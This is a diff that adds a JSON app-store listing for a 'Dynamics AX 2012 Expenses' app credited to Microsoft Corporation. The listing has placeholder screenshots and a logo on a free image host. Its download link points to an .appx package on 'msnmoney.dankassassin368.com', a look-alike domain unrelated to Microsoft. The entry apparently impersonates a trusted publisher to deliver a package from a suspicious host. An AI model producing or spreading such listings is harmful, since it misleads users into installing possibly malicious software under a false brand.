@@ -1,0 +1,18 @@
+{
+    "displayname":  "Dynamics AX 2012 Expenses",
+    "productType":  "app",
+    "category":  "Finance",
+    "publisher":  "Microsoft Corporation",
+    "copyright":  "© 2026 Microsoft Corporation",
+    "description":  "Create and manage expense reports in the Dynamics AX 2012 Expenses app in conjunction with Microsoft Dynamics AX 2012. By downloading and using Dynamics AX 2012 Expenses, you accept the Microsoft software license terms: https://www.microsoft.com/en-us/download/details.aspx?id=39362. If you do not accept the terms, do not use the software.",
+    "mainStars":  "0",
+    "ratingNumber":  "0",
+    "ratingsCount":  "0",
+    "size":  "5.0 MB",
+    "ageRating":  "Everyone",
+    "imgUrl":  "https://i.ibb.co/5X5GNGdb/expenses.png",
+    "pageimg1":  "https://via.placeholder.com/800x450.png?text=Dynamics",
+    "pageimg2":  "https://via.placeholder.com/800x450.png?text=Dynamics",
+    "pageimg3":  "https://via.placeholder.com/800x450.png?text=Dynamics",
+    "downloadUri":  "https://msnmoney.dankassassin368.com/appx/expenses.appx"
+}
